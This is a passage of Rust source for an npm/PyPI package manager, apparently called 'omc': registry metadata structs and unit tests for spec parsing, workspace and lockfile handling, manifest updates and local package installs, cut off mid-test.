#[derive(Debug, Clone, Default, Deserialize)]
struct NpmPeerDependencyMeta {
    #[serde(default)]
    optional: bool,
}

#[derive(Debug, Deserialize)]
struct NpmDist {
    tarball: String,
    #[serde(default)]
    shasum: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PypiResponse {
    info: PypiInfo,
    urls: Vec<PypiFile>,
}

#[derive(Debug, Deserialize)]
struct PypiInfo {
    name: String,
    version: String,
    #[serde(default)]
    requires_dist: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct PypiRoot {
    info: PypiInfo,
    releases: BTreeMap<String, Vec<PypiFile>>,
}

#[derive(Debug, Deserialize)]
struct PypiFile {
    filename: String,
    packagetype: String,
    url: String,
    digests: PypiDigests,
    #[serde(default)]
    requires_python: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PypiDigests {
    sha256: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has_spec(specs: &[PackageSpec], name: &str, requirement: &str) -> bool {
        specs
            .iter()
            .any(|spec| spec.name == name && spec.version.as_deref() == Some(requirement))
    }

    fn commit_git_repo(path: &Path) {
        assert!(Command::new("git")
            .arg("init")
            .arg("--quiet")
            .arg(path)
            .status()
            .unwrap()
            .success());
        assert!(Command::new("git")
            .arg("-C")
            .arg(path)
            .arg("add")
            .arg(".")
            .status()
            .unwrap()
            .success());
        assert!(Command::new("git")
            .arg("-C")
            .arg(path)
            .arg("-c")
            .arg("user.email=omc@example.invalid")
            .arg("-c")
            .arg("user.name=omc test")
            .arg("commit")
            .arg("--quiet")
            .arg("-m")
            .arg("initial")
            .status()
            .unwrap()
            .success());
    }

    #[test]
    fn parses_npm_specs() {
        let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Npm);
        assert_eq!(spec.name, "left-pad");
        assert_eq!(spec.version.as_deref(), Some("1.3.0"));

        let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
        assert_eq!(spec.name, "@scope/pkg");
        assert_eq!(spec.version.as_deref(), Some("2.0.0"));
    }

    #[test]
    fn parses_pypi_specs() {
        let spec = PackageSpec::parse("pypi:requests==2.32.3").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Pypi);
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert!(spec.extras.is_empty());

        let spec = PackageSpec::parse("pypi:six@1.16.0").unwrap();
        assert_eq!(spec.name, "six");
        assert_eq!(spec.version.as_deref(), Some("1.16.0"));

        let spec = PackageSpec::parse("pypi:urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        let spec = PackageSpec::parse("pypi:requests[socks,security]==2.32.3").unwrap();
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert_eq!(
            spec.extras,
            BTreeSet::from(["security".to_owned(), "socks".to_owned()])
        );
        assert_eq!(spec.package_key(), "pypi:requests[security,socks]");

        let spec = PackageSpec::parse(
            "pypi:idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        )
        .unwrap();
        assert_eq!(spec.name, "idna");
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );
    }

    #[test]
    fn resolves_common_npm_ranges() {
        assert!(npm_version_satisfies("6.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("6.1.2", "^6.0.0"));
        assert!(!npm_version_satisfies("7.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("1.2.9", "~1.2.0"));
        assert!(!npm_version_satisfies("1.3.0", "~1.2.0"));
        assert!(npm_version_satisfies("1.1.3", "^1.1.0,1.1.3"));
        assert!(!npm_version_satisfies("1.3.0", "^1.1.0,1.1.3"));
    }

    #[test]
    fn parses_npm_alias_requirements() {
        let spec = PackageSpec {
            ecosystem: Ecosystem::Npm,
            name: "string-width-cjs".to_owned(),
            version: Some("npm:string-width@^4.2.0".to_owned()),
            extras: BTreeSet::new(),
            direct_url: None,
        };
        let (registry_name, requirement) = npm_registry_name_and_requirement(&spec).unwrap();
        assert_eq!(registry_name, "string-width");
        assert_eq!(requirement.as_deref(), Some("^4.2.0"));
    }

    #[test]
    fn parses_npm_direct_tarball_specs() {
        let spec =
            PackageSpec::parse("npm:local-pkg @ https://example.invalid/local-pkg-1.0.0.tgz")
                .unwrap();
        assert_eq!(spec.name, "local-pkg");
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://example.invalid/local-pkg-1.0.0.tgz")
        );
    }

    #[test]
    fn parses_npm_direct_local_tarball_reference() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join("local-pkg-1.0.0.tgz");
        fs::write(
            &archive,
            npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
        )
        .unwrap();

        let spec = parse_npm_direct_archive_reference("./local-pkg-1.0.0.tgz", dir.path())
            .unwrap()
            .unwrap();

        assert_eq!(spec.name, "local-pkg");
        assert_eq!(spec.ecosystem, Ecosystem::Npm);
        assert!(spec.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(spec
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/local-pkg-1.0.0.tgz"));
    }

    #[test]
    fn writes_direct_url_manifest_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join("local-pkg-1.0.0.tgz");
        fs::write(
            &archive,
            npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
        )
        .unwrap();
        let spec = parse_npm_direct_archive_reference("./local-pkg-1.0.0.tgz", dir.path())
            .unwrap()
            .unwrap();

        add_package_graph(&spec, &LinkOptions::new(dir.path())).unwrap();

        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        let requirement = manifest.dependencies.get("npm:local-pkg").unwrap();
        assert!(requirement.starts_with("file://"));
        assert!(parse_manifest_dependency("npm:local-pkg", requirement)
            .unwrap()
            .direct_url
            .is_some());
    }

    #[test]
    fn skips_manifest_write_when_save_is_disabled() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join("transient-pkg-1.0.0.tgz");
        fs::write(
            &archive,
            npm_tgz_for_test(r#"{ "name": "transient-pkg", "version": "1.0.0" }"#),
        )
        .unwrap();
        let spec = parse_npm_direct_archive_reference("./transient-pkg-1.0.0.tgz", dir.path())
            .unwrap()
            .unwrap();

        let mut options = LinkOptions::new(dir.path());
        options.save_manifest_dependency = false;
        add_package_graph(&spec, &options).unwrap();

        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        assert!(manifest.dependencies.is_empty());
        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
        assert!(lock
            .packages
            .iter()
            .any(|package| package.name == "transient-pkg"));
    }

    #[test]
    fn reads_project_package_json_specs() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("vendor/local-dir")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/linked-pkg")).unwrap();
        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "scripts": { "check": "node -e \"console.log('ok')\"" },
                "dependencies": {
                    "is-odd": "3.0.1",
                    "local-dir": "file:vendor/local-dir",
                    "linked-pkg": "link:vendor/linked-pkg"
                },
                "devDependencies": { "which": "^2.0.2" },
                "optionalDependencies": {
                    "is-even": "1.0.0",
                    "local-pkg": "file:vendor/local-pkg-1.0.0.tgz",
                    "remote-pkg": "https://example.invalid/remote-pkg-2.0.0.tgz",
                    "workspace-pkg": "workspace:*"
                },
                "peerDependencies": {
                    "left-pad": "1.3.0",
                    "optional-peer": "1.0.0"
                },
                "peerDependenciesMeta": {
                    "optional-peer": { "optional": true }
                }
            }"#,
        )
        .unwrap();
        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "which" && spec.version.as_deref() == Some("^2.0.2")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-even" && spec.version.as_deref() == Some("1.0.0")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("1.3.0")));
        assert!(!specs.iter().any(|spec| spec.name == "optional-peer"));
        let local_pkg = specs.iter().find(|spec| spec.name == "local-pkg").unwrap();
        assert!(local_pkg
            .direct_url
            .as_deref()
            .unwrap()
            .starts_with("file://"));
        assert!(local_pkg
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("/vendor/local-pkg-1.0.0.tgz"));
        assert!(specs.iter().any(|spec| spec.name == "remote-pkg"
            && spec.direct_url.as_deref() == Some("https://example.invalid/remote-pkg-2.0.0.tgz")));
        assert!(!specs.iter().any(|spec| spec.name == "workspace-pkg"));
        assert!(!specs.iter().any(|spec| spec.name == "local-dir"));
        assert!(!specs.iter().any(|spec| spec.name == "linked-pkg"));

        let scripts = read_package_scripts(dir.path()).unwrap();
        assert_eq!(
            scripts.get("check").map(String::as_str),
            Some("node -e \"console.log('ok')\"")
        );

        let production_specs = read_package_json_specs(&package_json, false).unwrap();
        assert!(production_specs
            .iter()
            .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
        assert!(!production_specs.iter().any(|spec| spec.name == "which"));
    }

    #[test]
    fn reads_pipfile_scripts_and_package_json_overrides() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("Pipfile"),
            r#"
            [packages]
            idna = "==3.7"

            [scripts]
            test = "pytest"
            lint = "ruff check ."
            "#,
        )
        .unwrap();

        let scripts = read_package_scripts(dir.path()).unwrap();
        assert_eq!(scripts.get("test").map(String::as_str), Some("pytest"));
        assert_eq!(
            scripts.get("lint").map(String::as_str),
            Some("ruff check .")
        );

        fs::write(
            dir.path().join("package.json"),
            r#"{
                "scripts": {
                    "test": "node test.js",
                    "build": "node build.js"
                }
            }"#,
        )
        .unwrap();

        let scripts = read_package_scripts(dir.path()).unwrap();
        assert_eq!(
            scripts.get("test").map(String::as_str),
            Some("node test.js")
        );
        assert_eq!(
            scripts.get("lint").map(String::as_str),
            Some("ruff check .")
        );
        assert_eq!(
            scripts.get("build").map(String::as_str),
            Some("node build.js")
        );
    }

    #[test]
    fn rejects_unsupported_npm_file_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{ "dependencies": { "local-pkg": "file:../local-pkg" } }"#,
        )
        .unwrap();

        let error = read_package_json_specs(&package_json, true).unwrap_err();
        assert!(error
            .to_string()
            .contains("must be a .tgz/.tar.gz tarball or an existing directory"));
    }

    #[test]
    fn reads_package_json_overrides_and_resolutions_as_constraints() {
        let dir = tempfile::tempdir().unwrap();
        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "dependencies": { "left-pad": "^1.0.0" },
                "overrides": {
                    "left-pad": "1.3.0",
                    "@scope/pkg@^2.0.0": { ".": "2.1.0", "transitive": "3.0.0" },
                    "ignored": "file:../ignored"
                },
                "resolutions": {
                    "**/ansi-regex": "5.0.1",
                    "@demo/tool": "4.0.0"
                }
            }"#,
        )
        .unwrap();

        let requirements = read_package_json_requirements(&package_json, true).unwrap();
        assert_eq!(
            requirements
                .constraints
                .get("npm:left-pad")
                .map(String::as_str),
            Some("1.3.0")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:@scope/pkg")
                .map(String::as_str),
            Some("2.1.0")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:transitive")
                .map(String::as_str),
            Some("3.0.0")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:ansi-regex")
                .map(String::as_str),
            Some("5.0.1")
        );
        assert_eq!(
            requirements
                .constraints
                .get("npm:@demo/tool")
                .map(String::as_str),
            Some("4.0.0")
        );
        assert!(!requirements.constraints.contains_key("npm:ignored"));
    }

    #[test]
    fn reads_workspace_package_json_specs() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("packages/api")).unwrap();
        fs::create_dir_all(dir.path().join("packages/ignored")).unwrap();
        fs::create_dir_all(dir.path().join("node_modules/nope")).unwrap();

        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*", "!packages/ignored"],
                "dependencies": { "root-dep": "1.0.0" },
                "devDependencies": { "root-dev": "2.0.0" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/api/package.json"),
            r#"{
                "name": "api",
                "dependencies": { "workspace-dep": "3.0.0" },
                "devDependencies": { "workspace-dev": "4.0.0" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/ignored/package.json"),
            r#"{ "dependencies": { "ignored-dep": "5.0.0" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("node_modules/nope/package.json"),
            r#"{ "dependencies": { "node-modules-dep": "6.0.0" } }"#,
        )
        .unwrap();

        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(has_spec(&specs, "root-dep", "1.0.0"));
        assert!(has_spec(&specs, "root-dev", "2.0.0"));
        assert!(has_spec(&specs, "workspace-dep", "3.0.0"));
        assert!(has_spec(&specs, "workspace-dev", "4.0.0"));
        assert!(!specs.iter().any(|spec| spec.name == "ignored-dep"));
        assert!(!specs.iter().any(|spec| spec.name == "node-modules-dep"));

        let production_specs = read_package_json_specs(&package_json, false).unwrap();
        assert!(has_spec(&production_specs, "root-dep", "1.0.0"));
        assert!(has_spec(&production_specs, "workspace-dep", "3.0.0"));
        assert!(!production_specs.iter().any(|spec| spec.name == "root-dev"));
        assert!(!production_specs
            .iter()
            .any(|spec| spec.name == "workspace-dev"));
    }

    #[test]
    fn installs_npm_workspace_links() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("packages/lib")).unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*"],
                "dependencies": { "@demo/lib": "workspace:*" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/lib/package.json"),
            r#"{ "name": "@demo/lib", "main": "index.js", "bin": { "demo-lib": "cli.js" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/lib/index.js"),
            "module.exports = 41;\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/lib/cli.js"),
            "#!/usr/bin/env node\n",
        )
        .unwrap();

        let report = install_project(&LinkOptions::new(dir.path())).unwrap();
        assert_eq!(report.npm_packages, 0);
        assert_eq!(report.npm_bins, 1);
        assert_eq!(
            fs::read_to_string(dir.path().join("node_modules/@demo/lib/index.js")).unwrap(),
            "module.exports = 41;\n"
        );
        assert!(dir.path().join("node_modules/.bin/demo-lib").exists());
    }

    #[test]
    fn installs_npm_root_package_bins() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "@demo/root",
                "bin": { "root-tool": "cli.js" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("cli.js"),
            "#!/usr/bin/env node\nconsole.log('root-tool-ok')\n",
        )
        .unwrap();

        let report = install_project(&LinkOptions::new(dir.path())).unwrap();
        assert_eq!(report.npm_packages, 0);
        assert_eq!(report.npm_bins, 1);

        let output = Command::new(dir.path().join("node_modules/.bin/root-tool"))
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "root-tool-ok"
        );
    }

    #[test]
    fn installs_npm_local_directory_links_respecting_omit_dev() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("vendor/local-pkg")).unwrap();
        fs::create_dir_all(dir.path().join("vendor/dev-pkg")).unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{
                "name": "local-link-root",
                "dependencies": { "local-pkg": "file:vendor/local-pkg" },
                "devDependencies": { "dev-pkg": "link:vendor/dev-pkg" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/local-pkg/index.js"),
            "module.exports = 41;\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/local-pkg/package.json"),
            r#"{ "name": "local-pkg", "bin": { "local-tool": "cli.js" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/local-pkg/cli.js"),
            "#!/usr/bin/env node\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/dev-pkg/index.js"),
            "module.exports = 42;\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/dev-pkg/package.json"),
            r#"{ "name": "dev-pkg", "bin": { "dev-tool": "cli.js" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/dev-pkg/cli.js"),
            "#!/usr/bin/env node\n",
        )
        .unwrap();

        let mut options = LinkOptions::new(dir.path());
        options.include_dev_dependencies = false;
        let report = install_project(&options).unwrap();
        assert_eq!(report.npm_bins, 1);
        assert_eq!(
            fs::read_to_string(dir.path().join("node_modules/local-pkg/index.js")).unwrap(),
            "module.exports = 41;\n"
        );
        assert!(dir.path().join("node_modules/.bin/local-tool").exists());
        assert!(!dir.path().join("node_modules/.bin/dev-tool").exists());
        assert!(!dir.path().join("node_modules/dev-pkg").exists());

        options.include_dev_dependencies = true;
        let report = install_project(&options).unwrap();
        assert_eq!(report.npm_bins, 2);
        assert_eq!(
            fs::read_to_string(dir.path().join("node_modules/dev-pkg/index.js")).unwrap(),
            "module.exports = 42;\n"
        );
        assert!(dir.path().join("node_modules/.bin/dev-tool").exists());
    }

    #[test]
    fn installs_manifest_npm_local_paths() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("vendor/direct-pkg")).unwrap();
        fs::write(
            dir.path().join("vendor/direct-pkg/index.js"),
            "module.exports = 43;\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/direct-pkg/package.json"),
            r#"{ "name": "direct-pkg", "bin": { "direct-tool": "cli.js" } }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("vendor/direct-pkg/cli.js"),
            "#!/usr/bin/env node\n",
        )
        .unwrap();

        add_manifest_npm_local_paths(dir.path(), &[PathBuf::from("vendor/direct-pkg")], false)
            .unwrap();
        let report = install_project(&LinkOptions::new(dir.path())).unwrap();

        assert_eq!(report.npm_bins, 1);
        assert_eq!(
            fs::read_to_string(dir.path().join("node_modules/direct-pkg/index.js")).unwrap(),
            "module.exports = 43;\n"
        );
        assert!(dir.path().join("node_modules/.bin/direct-tool").exists());
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        assert_eq!(manifest.npm_local_paths, vec!["vendor/direct-pkg"]);
    }

    #[test]
    fn dev_manifest_npm_local_paths_respect_omit_dev() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("vendor/dev-pkg")).unwrap();
        fs::write(
            dir.path().join("vendor/dev-pkg/package.json"),
            r#"{ "name": "dev-pkg" }"#,
        )
        .unwrap();

        add_manifest_npm_local_paths(dir.path(), &[PathBuf::from("vendor/dev-pkg")], true).unwrap();

        let mut options = LinkOptions::new(dir.path());
        options.include_dev_dependencies = false;
        install_project(&options).unwrap();
        assert!(!dir.path().join("node_modules/dev-pkg").exists());

        options.include_dev_dependencies = true;
        install_project(&options).unwrap();
        assert!(dir.path().join("node_modules/dev-pkg").exists());
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        assert_eq!(manifest.npm_dev_local_paths, vec!["vendor/dev-pkg"]);
    }

    #[test]
    fn lock_project_updates_lock_without_installing_packages() {
        let dir = tempfile::tempdir().unwrap();
        let archive = dir.path().join("local-pkg-1.0.0.tgz");
        fs::write(
            &archive,
            npm_tgz_for_test(r#"{ "name": "local-pkg", "version": "1.0.0" }"#),
        )
        .unwrap();
        fs::write(
            dir.path().join("package.json"),
            r#"{ "dependencies": { "local-pkg": "file:local-pkg-1.0.0.tgz" } }"#,
        )
        .unwrap();

        let reports = lock_project(&LinkOptions::new(dir.path())).unwrap();

        assert!(reports
            .iter()
            .any(|report| report.locked.name == "local-pkg"));
        let lock = read_lockfile(dir.path().join("omc.lock")).unwrap();
        assert!(lock
            .packages
            .iter()
            .any(|package| package.name == "local-pkg"));
        assert!(!dir.path().join("node_modules").exists());
    }

    #[test]
    fn reads_workspace_package_json_specs_from_object_form() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("apps/web")).unwrap();

        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "name": "workspace-root",
                "workspaces": {
                    "packages": ["apps/*"]
                }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("apps/web/package.json"),
            r#"{ "name": "web", "dependencies": { "web-dep": "1.2.3" } }"#,
        )
        .unwrap();

        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(has_spec(&specs, "web-dep", "1.2.3"));
    }

    #[test]
    fn removes_manifest_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let manifest = OmcManifest {
            project: ProjectInfo {
                name: "remove-demo".to_owned(),
                version: "0.1.0".to_owned(),
            },
            dependencies: BTreeMap::from([("npm:left-pad".to_owned(), "1.3.0".to_owned())]),
            dev_dependencies: BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]),
            npm_local_paths: Vec::new(),
            npm_dev_local_paths: Vec::new(),
            policy: ManifestPolicy {
                allow: vec!["http:api.example.com".to_owned()],
            },
            registries: ManifestRegistries::default(),
        };
        fs::write(
            dir.path().join("omc.toml"),
            toml::to_string_pretty(&manifest).unwrap(),
        )
        .unwrap();

        let removed =
            remove_manifest_dependency(dir.path(), &PackageSpec::parse("npm:left-pad").unwrap())
                .unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert!(removed);
        assert!(manifest.dependencies.is_empty());
        assert_eq!(
            manifest.dev_dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );
        assert_eq!(manifest.policy.allow, vec!["http:api.example.com"]);
    }

    #[test]
    fn writes_manifest_dev_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let spec = PackageSpec::parse("npm:is-odd@3.0.1").unwrap();
        write_manifest_dependency(dir.path(), &spec, "3.0.1", true).unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert!(manifest.dependencies.is_empty());
        assert_eq!(
            manifest.dev_dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );

        write_manifest_dependency(dir.path(), &spec, "3.0.1", false).unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();
        assert_eq!(
            manifest.dependencies,
            BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())])
        );
        assert!(manifest.dev_dependencies.is_empty());
    }

    #[test]
    fn adds_manifest_policy_grants() {
        let dir = tempfile::tempdir().unwrap();
        let added = add_manifest_policy_grants(
            dir.path(),
            &[
                "http:api.example.com".to_owned(),
                "env:API_TOKEN".to_owned(),
                "http:api.example.com".to_owned(),
            ],
        )
        .unwrap();
        let manifest = read_manifest(dir.path().join("omc.toml")).unwrap();

        assert_eq!(
            added,
            vec![
                "http:api.example.com".to_owned(),
                "env.read:API_TOKEN".to_owned()
            ]
        );
        assert_eq!(
            manifest.policy.allow,
            vec![
                "env.read:API_TOKEN".to_owned(),
                "http:api.example.com".to_owned()
            ]
        );
    }

    #[test]
    fn reads_npm_runtime_optional_and_peer_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([(
                "runtime".to_owned(),
                "^1.0.0".to_owned(),
            )])),
            optional_dependencies: Some(BTreeMap::from([(
                "optional-runtime".to_owned(),
                "^2.0.0".to_owned(),
            )])),
            bundle_dependencies: None,
            bundled_dependencies: None,
            peer_dependencies: Some(BTreeMap::from([
                ("required-peer".to_owned(), "^3.0.0".to_owned()),
                ("optional-peer".to_owned(), "^4.0.0".to_owned()),
            ])),
            peer_dependencies_meta: Some(BTreeMap::from([(
                "optional-peer".to_owned(),
                NpmPeerDependencyMeta { optional: true },
            )])),
        };

        let dependencies = npm_runtime_dependencies(&version_doc);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "runtime"
                && dependency.spec.version.as_deref() == Some("^1.0.0")
                && !dependency.optional));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "optional-runtime"
                && dependency.spec.version.as_deref() == Some("^2.0.0")
                && dependency.optional));
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "required-peer"
                && dependency.spec.version.as_deref() == Some("^3.0.0")
                && !dependency.optional));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "optional-peer"));
    }

    #[test]
    fn evaluates_npm_platform_lists() {
        assert!(npm_string_list_allows(
            Some(&NpmStringList::Many(vec![current_npm_os().to_owned()])),
            Some(current_npm_os())
        ));
        assert!(!npm_string_list_allows(
            Some(&NpmStringList::Many(vec![format!("!{}", current_npm_os())])),
            Some(current_npm_os())
        ));
        assert!(npm_string_list_allows(
            Some(&NpmStringList::Many(vec![
                "!definitely-not-this-os".to_owned()
            ])),
            Some(current_npm_os())
        ));
        assert!(!npm_string_list_allows(
            Some(&NpmStringList::Many(vec![
                "definitely-not-this-os".to_owned()
            ])),
            Some(current_npm_os())
        ));
    }

    #[test]
    fn skips_npm_bundled_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([
                ("bundled-runtime".to_owned(), "^1.0.0".to_owned()),
                ("external-runtime".to_owned(), "^2.0.0".to_owned()),
            ])),
            optional_dependencies: Some(BTreeMap::from([(
                "bundled-optional".to_owned(),
                "^3.0.0".to_owned(),
            )])),
            bundle_dependencies: Some(NpmStringList::Many(vec![
                "bundled-runtime".to_owned(),
                "bundled-optional".to_owned(),
            ])),
            bundled_dependencies: None,
            peer_dependencies: None,
            peer_dependencies_meta: None,
        };

        let dependencies = npm_runtime_dependencies(&version_doc);
        assert!(dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "external-runtime"));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "bundled-runtime"));
        assert!(!dependencies
            .iter()
            .any(|dependency| dependency.spec.name == "bundled-optional"));
    }

    #[test]
    fn supports_boolean_npm_bundle_dependencies() {
        let version_doc = NpmVersion {
            version: "1.0.0".to_owned(),
            dist: NpmDist {
                tarball: "https://example.invalid/package.tgz".to_owned(),
                shasum: None,
                integrity: None,
            },
            os: None,
            cpu: None,
            libc: None,
            scripts: None,
            dependencies: Some(BTreeMap::from([(
                "bundled-runtime".to_owned(),
                "^1.0.0".to_owned(),
            )])),
            optional_dependencies: None,
            bundle_dependencies: Some(NpmStringList::Bool(true)),
            bundled_dependencies: None,
            peer_dependencies: None,
            peer_dependencies_meta: None,
        };

        assert!(npm_runtime_dependencies(&version_doc).is_empty());
    }

    #[test]
    fn reads_package_lock_constraints_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": { "version": "3.0.1" },
                    "node_modules/@scope/pkg": { "version": "1.2.3" },
                    "node_modules/a/node_modules/dup": { "version": "1.0.0" },
                    "node_modules/b/node_modules/dup": { "version": "2.0.0" }
                }
            }"#,
        )
        .unwrap();

        let constraints = read_package_lock_requirements(&package_lock)
            .unwrap()
            .constraints;
        assert_eq!(
            constraints.get("npm:is-odd").map(String::as_str),
            Some("3.0.1")
        );
        assert_eq!(
            constraints.get("npm:@scope/pkg").map(String::as_str),
            Some("1.2.3")
        );
        assert!(!constraints.contains_key("npm:dup"));
    }

    #[test]
    fn reads_package_lock_integrities_for_unique_versions() {
        let dir = tempfile::tempdir().unwrap();
        let package_lock = dir.path().join("package-lock.json");
        fs::write(
            &package_lock,
            r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/is-odd": {
                        "version": "3.0.1",
                        "integrity": "sha512-FGl0QHAcOIX3yNX6pZ8za0ccqGMyA07/DT/dwC3JsYuDVuhA21SCPI/S8svQkGlpzxMs+Lucc9x2m0/9gXvSPQ=="
                    },
                    "node_modules/a/node_modules/dup": {
                        "version": "1.0.0",
                        "integrity": "sha512-one"
                    },
                    "node_modules/b/node_modules/dup": {
                        "version": "2.0.0",
                        "integrity": "sha512-two"
                    }
                },
                "dependencies": {
                    "legacy": {
                        "version": "4.0.0",
                        "integrity": "sha1-Hl3LtZt1PLHUbiNNj2GAKFuLhq0="
                    }
                }
            }"#,
        )
        .unwrap();

        let requirements = read_package_lock_requirements(&package_lock).unwrap();
        assert_eq!(
            requirements
                .npm_integrities
                .get("npm:is-odd")
                .and_then(|values| values.iter().next())
                .map(String::as_str),
            Some(
